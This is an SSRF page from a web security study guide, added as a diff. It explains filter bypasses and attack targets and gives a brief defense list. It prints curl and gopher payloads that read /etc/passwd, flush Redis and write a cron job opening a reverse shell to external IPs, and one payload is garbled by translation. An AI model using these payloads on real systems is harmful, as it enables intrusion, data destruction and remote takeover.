@@ -1,0 +1,282 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en-US" data-content_root="../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SSRF &mdash; Web Security Study Notes 1.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=fa44fd50" />
+      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=e59714d7" />
+
+  
+      <script src="../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../_static/documentation_options.js?v=4042127e"></script>
+      <script src="../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../index.html" class="icon icon-home">
+            Web Security Study Notes
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Content index:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../basic/index.html">1. Introduction</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../network/index.html">2. Computer network and protocol</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../info/index.html">3. Information collection</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../language/index.html">4. Language and framework</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../intranet/index.html">5. Intranet penetration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cloud/index.html">6. Cloud Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defense/index.html">7. Defense Technology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../auth/index.html">8. Authentication mechanism</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../tools/index.html">9. Tools and resources</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../manual/index.html">10. Quick manual check</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/index.html">11. other</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">Web Security Study Notes</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">SSRF</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/vuln/ssrf.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="ssrf">
+<h1>SSRF<a class="headerlink" href="#ssrf" title="Link to this heading"></a></h1>
+<section id="introduction">
+<h2>Introduction<a class="headerlink" href="#introduction" title="Link to this heading"></a></h2>
+<p>Server Side Request Forgery (SSRF) refers to an attacker using a server vulnerability to send a constructed request to the server’s intranet as the server when he fails to obtain all the server’s permissions. SSRF attacks usually target internal systems that are not directly accessible to external networks.</p>
+<section id="vulnerability-hazards">
+<h3>Vulnerability hazards<a class="headerlink" href="#vulnerability-hazards" title="Link to this heading"></a></h3>
+<p>SSRF can scan the ports of the external network, the intranet where the server is located, and the local area, attack applications running on the intranet or local area, or use the File protocol to read local files.</p>
+<p>Intranet service defense is generally weaker than external network services. Some intranet services do not set permission verification for intranet access for convenience of operation and maintenance. Therefore, when SSRF exists, it usually causes great harm.</p>
+</section>
+</section>
+<section id="how-to-use">
+<h2>How to use<a class="headerlink" href="#how-to-use" title="Link to this heading"></a></h2>
+<p>There are many forms and different scenarios for SSRF utilization, and different utilization and bypass methods can be used for different scenarios.</p>
+<p>Taking curl as an example, you can use the dict protocol to operate Redis, file protocol reading files, gopher protocol rebound shell and other functions. Common Payloads are as follows:</p>
+<p>Curl -VVV ‘Dict: //127.0.0.1: 6379/info’</p>
+<p>curl -vvv ‘<a class="reference external" href="file:///etc/passwd">file:///etc/passwd</a>’</p>
+<p># * Note: The link uses single quotes to avoid $ variable issues</p>
+<p>curl -vvv ‘Gopher: //127.0.0.1: 6379/_*1%0d%0A $ 8%0D%0DFLUSHALL%0D%0D%0A*3%0D%0d%0a $ 3%0D%0D%0D%0D $ 1%0D%0A1%0D% 0A $ 64%0D%0A%0D%0A%0A%0A <a href="#id1"><span class="problematic" id="id2">*</span></a>/1 * * * * BASH -i&gt; &amp; /dev/tcp/103.21.140.84/6789 0&gt; &amp; 1%0a%0a%0A%0A%0A%0D%0A%0D%0D%0A%0D%0A*4%0D%0D $ 6%0D%0CONFIG%0D%0D%0A $ 3%0D%0D%0D%0D%0D%0A $ 3 %0D%0adir%0D%0A $ 16%0D%0A/WER/SPOOL/CRON/%0D %0A*4%0D%0A $ 6%0D%0ACONFIG%0D%0A $ 3%0D%0D%0D%0D%0A $ 10%0D%0DBFILENAME%0D%0D%0A $ 4%0D%0D%0D%0D%0A*1%0D%0a $ 4%0D%0Asave%0D%0AQUIT%0D%0A ‘</p>
+</section>
+<section id="related-hazard-functions">
+<h2>Related hazard functions<a class="headerlink" href="#related-hazard-functions" title="Link to this heading"></a></h2>
+<p>The dangerous functions involved in SSRF are mainly network access and support pseudo-protocol network reading. Taking PHP as an example, the functions involved include <code class="docutils literal notranslate"><span class="pre">file_get_contents()</span></code>/<cite>fsocopen()`</cite>/<cite>curl_exec()`</cite>, etc.</p>
+</section>
+<section id="filter-bypass">
+<h2>Filter bypass<a class="headerlink" href="#filter-bypass" title="Link to this heading"></a></h2>
+<section id="change-the-ip-address-writing-method">
+<h3>Change the IP address writing method<a class="headerlink" href="#change-the-ip-address-writing-method" title="Link to this heading"></a></h3>
+<p>Some developers will filter out the intranet IP by regular matching of the passed URL parameters, such as the following regular expression:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</span></code></p></li>
+</ul>
+<p>For this filtering, we use the method of adapting the IP to bypass it. For example, the IP address 192.168.0.1 can be rewritten as:</p>
+<ul class="simple">
+<li><p>Eight-digit format: 0300.0250.0.1</p></li>
+<li><p>Hexadecimal format: 0xC0.0xA8.0.1</p></li>
+<li><p>Decimal integer format: 3232235521</p></li>
+<li><p>Hexadecimal integer format: 0xC0A80001</p></li>
+<li><p>Merge the last two digits: 1.1.278 / 1.1.755</p></li>
+<li><p>Merge the last three digits: 1.278/1.755/3.14159267</p></li>
+</ul>
+<p>In addition, each bit in the IP can be mixed with each bit.</p>
+<p>When accessing the rewritten IP address, Apache will report 400 Bad Request, but other services such as Nginx and MySQL can still work normally.</p>
+<p>In addition, the IP 0.0.0.0 can be accessed directly to the local area and is usually missed by regular filtering.</p>
+</section>
+<section id="use-domain-names-that-resolve-to-the-intranet">
+<h3>Use domain names that resolve to the intranet<a class="headerlink" href="#use-domain-names-that-resolve-to-the-intranet" title="Link to this heading"></a></h3>
+<p>If the server does not first resolve the IP and then filter the intranet address, we can use localhost and other fields to resolve the domain name of the intranet.</p>
+<p>In addition, <code class="docutils literal notranslate"><span class="pre">xip.io</span></code> provides a convenient service. The subdomain of this website will be parsed to the corresponding IP, such as 192.168.0.1.xip.io, and resolved to 192.168.0.1.</p>
+</section>
+<section id="problems-arising-from-parsing-urls">
+<h3>Problems arising from parsing URLs<a class="headerlink" href="#problems-arising-from-parsing-urls" title="Link to this heading"></a></h3>
+<p>In some cases, the backend program may parse the accessed URL and filter the parsed host address. At this time, improper parsing of URL parameters may occur, resulting in the filtering being bypassed.</p>
+<p>For example, <code class="docutils literal notranslate"><span class="pre">http://www.baidu.com&#64;192.168.0.1/</span></code> When the backend program passes incorrect regular expressions (such as the character content after http to com, that is, www.baidu.com, When parsing the content of the above URL, it is very likely that the host that accesses the URL is www.baidu.com, but in fact, the content requested by this URL is on 192.168.0.1 content.</p>
+</section>
+<section id="use-jump">
+<h3>Use jump<a class="headerlink" href="#use-jump" title="Link to this heading"></a></h3>
+<p>If the backend server correctly parses the URL host and filters it after receiving the parameters, we can use jump to bypass it.</p>
+<p>You can use services such as <a class="reference external" href="http://httpbin.org/redirect-to?url=http://192.168.0.1">http://httpbin.org/redirect-to?url=http://192.168.0.1</a>, but since the URL contains an intranet IP address such as 192.168.0.1, it may be expressed regularly. filtering out can be bypassed by short addresses.</p>
+<p>Commonly used jumps include 302 jumps and 307 jumps. The difference is that 307 jumps will forward the data in the POST request, etc., but 302 jumps will not.</p>
+</section>
+<section id="through-various-non-http-protocols">
+<h3>Through various non-HTTP protocols<a class="headerlink" href="#through-various-non-http-protocols" title="Link to this heading"></a></h3>
+<p>If the server-side program verifies the protocol used to access the URL, it can be utilized through the non-HTTP protocol.</p>
+<p>For example, through gopher, POST or GET requests can be constructed in a url parameter to achieve the purpose of attacking intranet applications. For example, you can use the gopher protocol to attack Redis services with the intranet, and you can use the following URL:</p>
+<p><a class="reference external" href="gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1*">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1*</a> * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</p>
+<p>In addition to the gopher protocol, the File protocol is also a commonly used protocol in SSRF. This protocol is mainly used to access files in the local computer. We can access the computer locality through a format like <code class="docutils literal notranslate"><span class="pre">file:///path/to/file</span></code> document. Using the file protocol can avoid filtering of the accessed IP by the server program. For example, we can access the content of 1.txt on D disk through <code class="docutils literal notranslate"><span class="pre">file:///d:/1.txt</span></code>.</p>
+</section>
+<section id="dns-rebinding">
+<h3>DNS Rebinding<a class="headerlink" href="#dns-rebinding" title="Link to this heading"></a></h3>
+<p>A common protection idea is: for the URL parameters requested by the user, the server will first perform DNS resolution on it, and then judge the IP address returned by the DNS server. If it is on the blacklist, the request will be prohibited.</p>
+<p>However, during the whole process, there is a time difference between requesting the DNS service for the first time for domain name resolution to the second server to request the URL. Using this time difference, a DNS rebinding attack can be carried out.</p>
+<p>To complete the DNS rebinding attack, we need a domain name and specify the resolution of this domain name to our own DNS Server, write a resolution service on our controllable DNS Server, and set the TTL time to 0. This way you can attack, the complete attack process is:</p>
+<ul class="simple">
+<li><p>The server side obtains URL parameters, performs the first DNS resolution, and obtains an IP that is not an intranet</p></li>
+<li><p>For judgment on the obtained IP, if it is found to be a non-blacklist IP, it will pass verification</p></li>
+<li><p>The server side accesses the URL. Since the TTL set by the DNS server is 0, DNS resolution is performed again. This time the DNS server returns the intranet address.</p></li>
+<li><p>Since verification has been bypassed, the server side returns the result of accessing intranet resources.</p></li>
+</ul>
+<p>With the continuous development of DNS Rebinding technology, there are also some new attack methods:</p>
+<ul class="simple">
+<li><p>Reply multiple IP requests at the same time in one response, including public and intranet IPs</p></li>
+<li><p>For the case where the browser requests both A and AAAA records, first reply to the legal IPv6 address, and then reply to the intranet IPv4 address after a period of time</p></li>
+</ul>
+</section>
+<section id="use-ipv6">
+<h3>Use IPv6<a class="headerlink" href="#use-ipv6" title="Link to this heading"></a></h3>
+<p>Some services do not consider IPv6, but the intranet supports IPv6, so you can use the local IP of IPv6 such as <code class="docutils literal notranslate"><span class="pre">[::]`</span></code> <code class="docutils literal notranslate"><span class="pre">0000::1</span></code> or the intranet domain name of IPv6 to bypass filtering.</p>
+</section>
+<section id="usage-idn">
+<h3>Usage IDN<a class="headerlink" href="#usage-idn" title="Link to this heading"></a></h3>
+<p>Some network access tools such as Curl support internationalized Domain Name (IDN). Internationalized domain names are also called special character domain names, which refer to Internet domain names composed of partially or completely special characters or letters.</p>
+<p>Among these characters, some characters will make an equivalent conversion when accessed, for example <code class="docutils literal notranslate"><span class="pre">ⓔⓧⓐⓐⓜⓟⓛⓔ.ⓒⓞⓜ</span></code> is equivalent to <code class="docutils literal notranslate"><span class="pre">example.com</span></code>. In this way, characters such as <code class="docutils literal notranslate"><span class="pre">①</span> <span class="pre">②</span> <span class="pre">③</span> <span class="pre">④</span> <span class="pre">⑤</span> <span class="pre">⑥</span> <span class="pre">⑦</span> <span class="pre">⑧</span> <span class="pre">⑨</span> <span class="pre">⑩</span></code> can be used to bypass the intranet restrictions.</p>
+</section>
+</section>
+<section id="possible-points-of-utilization">
+<h2>Possible points of utilization<a class="headerlink" href="#possible-points-of-utilization" title="Link to this heading"></a></h2>
+<section id="intranet-service">
+<h3>Intranet service<a class="headerlink" href="#intranet-service" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>Apache Hadoop remote command execution</p></li>
+<li><p>axis2-admin deployment server command execution</p></li>
+<li><p>Confluence SSRF</p></li>
+<li><p>counchdb WEB API remote command execution</p></li>
+<li><p>dict</p></li>
+<li><p>docker API remote command execution</p></li>
+<li><p>Elasticsearch engine Groovy script command execution</p></li>
+<li><p>ftp/ftps (FTP blasting)</p></li>
+<li><p>Indirect command execution of glassfish arbitrary file reading and war file deployment</p></li>
+<li><p>gopher</p></li>
+<li><p>HFS remote command execution</p></li>
+<li><p>http、https</p></li>
+<li><p>imap/imaps/pop3/pop3s/smtp/smtps (explosive email username and password)</p></li>
+<li><p>Java debugging interface command execution</p></li>
+<li><p>JBOSS remote Invoker war command execution</p></li>
+<li><p>Jenkins Scripts interface command execution</p></li>
+<li><p>ldap</p></li>
+<li><p>mongodb</p></li>
+<li><p>php_fpm/fastcgi command execution</p></li>
+<li><p>rtsp - smb/smbs (connect to SMB)</p></li>
+<li><p>sftp</p></li>
+<li><p>ShellShock command execution</p></li>
+<li><p>Struts2 command execution</p></li>
+<li><p>telnet</p></li>
+<li><p>tftp (UDP protocol extension)</p></li>
+<li><p>Tomcat command execution</p></li>
+<li><p>WebDav PUT uploads any file</p></li>
+<li><p>WebSphere Admin can deploy war indirect command execution</p></li>
+<li><p>zentoPMS remote command execution</p></li>
+</ul>
+</section>
+<section id="redis-utilization">
+<h3>Redis Utilization<a class="headerlink" href="#redis-utilization" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>Write ssh public key</p></li>
+<li><p>Write crontab</p></li>
+<li><p>Write WebShell</p></li>
+<li><p>Windows write startup item</p></li>
+<li><p>Master-slave copy loading .so files</p></li>
+<li><p>Master-slave copy and write lossless files</p></li>
+</ul>
+</section>
+<section id="cloud-host">
+<h3>Cloud host<a class="headerlink" href="#cloud-host" title="Link to this heading"></a></h3>
+<p>In cloud environments such as AWS and Google, by accessing the metadata API or management API of the cloud environment, sensitive information and other effects can be achieved in some cases.</p>
+</section>
+</section>
+<section id="defense-method">
+<h2>Defense method<a class="headerlink" href="#defense-method" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>Filter the returned information</p></li>
+<li><p>Unified error message</p></li>
+<li><p>Restrict requested ports</p></li>
+<li><p>Prohibit uncommonly used protocols</p></li>
+<li><p>For DNS Rebinding, consider using DNS cache or Host whitelist</p></li>
+</ul>
+</section>
+<section id="reference-link">
+<h2>Reference link<a class="headerlink" href="#reference-link" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="http://www.91ri.org/17111.html">SSRF vulnerability analysis and utilization</a></p></li>
+<li><p><a class="reference external" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era Of SSRF</a></p></li>
+<li><p><a class="reference external" href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">php ssrf technique</a></p></li>
+<li><p><a class="reference external" href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html">Talk about how to reject SSRF vulnerability in Python development</a></p></li>
+<li><p><a class="reference external" href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/">SSRF Tips</a></p></li>
+<li><p><a class="reference external" href="https://joychou.org/web/phpssrf.html">SSRF in PHP</a></p></li>
+</ul>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025-2025, Lyle.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
